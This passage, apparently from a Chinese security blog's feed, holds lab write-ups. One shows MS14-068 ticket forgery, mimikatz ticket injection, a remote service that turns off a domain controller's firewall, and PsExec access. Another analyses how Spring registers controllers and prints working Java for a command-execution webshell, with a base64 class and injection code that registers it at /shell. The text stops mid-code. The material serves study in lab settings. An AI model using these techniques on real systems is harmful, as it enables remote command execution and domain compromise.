alt="image-20241116211428215"></p><blockquote><p>笑死后来发现这也是利用的，因为这个模块多用于信息收集</p></blockquote><p>看了一下win7，作者贴心的把工具都给我们附上了</p><p><img src="https://cdn.clown2024.cn/image-20241116212028478.png" alt="image-20241116212028478"></p><p>利用原理参考文章：<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></p><p>直接把工具从win7那拿过来方便一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">download C:\\Users\\douser\\Desktop\\MS14-068.exe /home/kali/Desktop<br></code></pre></td></tr></table></figure><p>漏洞利用条件：</p><p>1.域控没有打MS14-068的补丁(KB3011780)</p><p>2.拿下一台加入域的计算机</p><p>3.有这台域内计算机的域用户密码和Sid</p><p>我们还差一个sid没有抓取到，要去抓取一下</p><p>红温了，这会话又断了，受不了了，直接去win7那里偷一个sid过来(S-1-5-21-979886063-1111900045-1414766810-1107)，douser用户的</p><p>正常能拿cmd的话直接whoami &#x2F;all或者whoami &#x2F;user就能看到sid了</p><p>或者用meterpreter的run post&#x2F;windows&#x2F;gather&#x2F;credentials应该也可以</p><p>工具利用的命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;<br></code></pre></td></tr></table></figure><p>完了xs才发现这是exe程序，Linux用不了，那就改参考这篇文章的其他打法：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89</a></p><p>看了半天得作罢了感觉😭，基本都是在cmd下操作或者直接开启远程桌面上去操作</p><p>简单记一下流程吧，下面的操作是在win7的cmd上执行的，参考这篇文章：<a href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p><p>首先用ms14-068伪造票据</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">ms14-<span class="hljs-number">068</span>.exe -u douser@DEMO.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">183</span>.<span class="hljs-number">130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>他会生成一个票据文件，然后用mimikatz来注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造<br>mimikatz # kerberos::list          //查看当前机器凭证<br>mimikatz # kerberos::ptc &lt;生成的票据文件&gt;   //将票据注入到内存中<br></code></pre></td></tr></table></figure><p>然后就可以查看域控或者列出其c盘的文件了</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\WIN-ENS2VR5TR3N<br><span class="hljs-built_in">dir</span> \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>还可以通过sc命令来创建服务执行命令，比如关闭防火墙</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off&quot;<br><br>sc \\WIN-ENS2VR5TR3N <span class="hljs-built_in">start</span> unablefirewall<br></code></pre></td></tr></table></figure><p>关闭防火墙之后就可以直接永恒之蓝上线了其实</p><p>之前失败是因为被防火墙拦截</p><p><strong>一些清除痕迹的操作</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">klist purge #卸载凭据<br>klist #查看票据<br></code></pre></td></tr></table></figure><p><strong>获取交互式shell</strong></p><p>现在是成功注入了凭证</p><p>然后我们可以利用PsExec.exe获取一个交互式的shell</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">PsExec.exe -accepteula -s \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">19</span> <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure><p><strong>远程登录操作</strong></p><p>可以直接用永恒之蓝获取密码之后redesktop登录</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为兼容性已经似了两个靶场，求求你别似了&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;两张网卡，一张VMnet0和VMnet1都是仅主机模式&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场三</title>
    <link href="https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
    <id>https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</id>
    <published>2024-11-14T15:16:59.000Z</published>
    <updated>2024-11-15T12:01:48.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><p>挂起状态，账号已默认登陆，centos为出网机，第一次运行，需重新获取桥接模式网卡ip，也就是重启一下</p><p>除重新获取ip，不建议进行任何虚拟机操作。</p><p><img src="https://cdn.clown2024.cn/image-20241115110952089.png" alt="image-20241115110952089"></p><p><strong>目标：域控中存在一份重要文件。</strong></p><p>本次环境为黑盒测试，不提供虚拟机账号密码。</p><h1 id="作废了"><a href="#作废了😭" class="headerlink" title="作废了😭"></a>作废了😭</h1><p>两台Linux靶机运行不了，只能强制重启才能用，但是这样就不是登录状态了，然后账号密码也不知道，直接死在搭建环境了</p><p>只能看看别人的打靶过程了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。&lt;/p&gt;
&lt;p&gt;挂起状态，账号已默认登陆，</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Spring内存马学习</title>
    <link href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-13T03:17:56.000Z</published>
    <updated>2024-11-14T08:32:08.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Spring框架比较常用就不说了，网上大部分都是建一个spring+springmvc的项目来测试内存马，内存马主要的逻辑部分都集中在springmvc的部分，因为负责处理路由请求基本都是都是需要经由springmvc，所以我看也有叫springmvc内存马的。</p><p>我这里就直接搭一个springboot项目比较方便了，反正本身也是有springmvc的，所以内部逻辑也是一样分析</p><p>版本如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="controller内存马"><a href="#Controller内存马" class="headerlink" title="Controller内存马"></a>Controller内存马</h1><h2 id="contoller注册流程"><a href="#Contoller注册流程" class="headerlink" title="Contoller注册流程"></a>Contoller注册流程</h2><p>我们要先知道Controller的注册逻辑</p><p>编写一个简单的controller然后下断点</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113133819511.png" alt="image-20241113133819511"></p><p>这里能看到请求处理的调用栈</p><p>在AbstractHandlerMethodMapping的initHandlerMethods方法下断点来看看是怎么注册controller的</p><p><img src="https://cdn.clown2024.cn/image-20241113134431011.png" alt="image-20241113134431011"></p><p>从这个代码中也可以看到就是开始对每个扫描到的beanName对应的bean开始处理</p><p>进去看看他的process方法是怎么处理的</p><p><img src="https://cdn.clown2024.cn/image-20241113135311833.png" alt="image-20241113135311833"></p><p>直接看对我们写的helloController是怎么处理，这里有个isHandler()方法</p><p><img src="https://cdn.clown2024.cn/image-20241113135415874.png" alt="image-20241113135415874"></p><p>他会判断这个bean是否为Controller或者RequestMapping，很明显我们的这个会返回true</p><p>然后就会进到<strong>detectHandlerMethods</strong>方法，进去看一下这个方法</p><p><img src="https://cdn.clown2024.cn/image-20241113162637157.png" alt="image-20241113162637157"></p><p>可以看到他会先获取对应的userType、handler、method，还有对应的Mapping，最后遍历类中的所有方法和mapping，然后调用一个registerHandlerMethod方法来进行注册绑定</p><p>这里的mapping从图中可以看到他的信息是被保存在RequestMappingInfo这个类中的，下面是该类中的一些属性</p><p><img src="https://cdn.clown2024.cn/image-20241113163354872.png" alt="image-20241113163354872"></p><p>然后mapping的创建是在前面的getMappingForMethod方法创建的</p><p><img src="https://cdn.clown2024.cn/image-20241113163647021.png" alt="image-20241113163647021"></p><p>进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241113164045236.png" alt="image-20241113164045236"></p><p>里面的具体流程就自己看看就行，总之他会解析方法上的注解，然后创建对应的RequestMappingInfo</p><p>再回到registerHandlerMethod注册方法这里</p><p><img src="https://cdn.clown2024.cn/image-20241113164335000.png" alt="image-20241113164335000"></p><p><img src="https://cdn.clown2024.cn/image-20241113164359179.png" alt="image-20241113164359179"></p><p><img src="https://cdn.clown2024.cn/image-20241113164444913.png" alt="image-20241113164444913"></p><p>可以知道，最终就是调用的AbstractHandlerMethodMapping$MappingRegistry的register方法将路由和方法注册进去的，跟到这里就已经够了</p><p>所以我们要创建一个controller最终就是要调用MappingRegistry#register方法，调用这个方法的条件根据前面的分析可知</p><ol><li>bean实例</li><li>处理请求的method</li><li>对应的RequestMappinginfo对象</li></ol><h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>参考y4师傅的实现方式</p><p>首先我们要编写一个正常的controller类，也不能说正常就是去掉注解的controller，因为我们是手动加载的所以不需要注解</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将他编译成.class文件，再拿他的base64编码的字符串用下面代码注入内存马</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAjQoAIQBJCABKCwBLAEwLAE0ATggATwgAUAoAUQBSCgAMAFMIAFQKAAwAVQcAVgcAVwgAWAgAWQoACwBaCABbCABcBwBdCgALAF4KAF8AYAoAEgBhCABiCgASAGMKABIAZAoAEgBlCgASAGYKAGcAaAoAZwBpCgBnAGYLAE0AagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVwcAbgcAVgcAXQcAawEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABi9zaGVsbAEABm1ldGhvZAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDsBAANHRVQBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVzdENvbnRyb2xsZXI7DAAiACMBAARjb2RlBwBvDABwAHEHAHIMAHMAdAEAAAEAB29zLm5hbWUHAHUMAHYAcQwAdwB4AQADd2luDAB5AHoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHsBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAfAB9BwB+DAB/AIAMACIAgQEAAlxBDACCAIMMAIQAhQwAhgB4DACHACMHAG4MAIgAiQwAigAjDACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnL2Nsb3duL3NwcmluZ2Jvb3RtZW1vcnlzaGVsbC9jb250b3JsbGVyL1Rlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAADgAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEgAJABMAEQAUABUAFQAZABcAKQAYAEcAGgBiAB0AeAAeAIwAHwCRACAAmAAhAJ0AIgCiACMApQAkAK4AKACxACYAsgApACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAAGAABAEAAAgBBWwABcwBCAENbAAFlAEQARQACAEYAAAACAEcAPwAAAAYAAQBIAAA=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>,d, <span class="hljs-number">0</span>, d.length&#125;);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).newInstance(), mm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们访问hello路由的时候就能成功注入内存马</p><p>再去访问shell路由就能执行任意命令了</p><p><img src="https://cdn.clown2024.cn/image-20241113172717161.png" alt="image-20241113172717161"></p><blockquote><p>这里的实现要求服务器上得有你的恶意类，不然Class.forName这里就会报错，问了一下kimi他给出的理由如下：</p><ol><li><strong>类加载机制</strong>：<ul><li>Java的类加载机制是基于类加载器的。每个类加载器都有自己的类加载缓存。</li><li>当你使用<code>Class.forName</code>时，它会尝试从当前线程的上下文类加载器（<code>Thread.currentThread().getContextClassLoader()</code>）加载类。</li><li>如果类是通过<code>defineClass</code>方法动态创建的，它不会被任何类加载器的缓存，因此无法通过<code>Class.forName</code>找到。</li></ul></li><li><strong><code>defineClass</code>方法</strong>：<ul><li><code>defineClass</code>方法是<code>ClassLoader</code>类的一个方法，用于动态创建类。</li><li>通过<code>defineClass</code>创建的类不会被类加载器的缓存，因此无法通过常规的类加载机制找到。</li></ul></li></ol></blockquote><p>后来在kimi的帮助下改成这样就可以了，就不用Class.forName，直接让他invoke的时候强转成Class就可以用了</p><p>修改后的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span 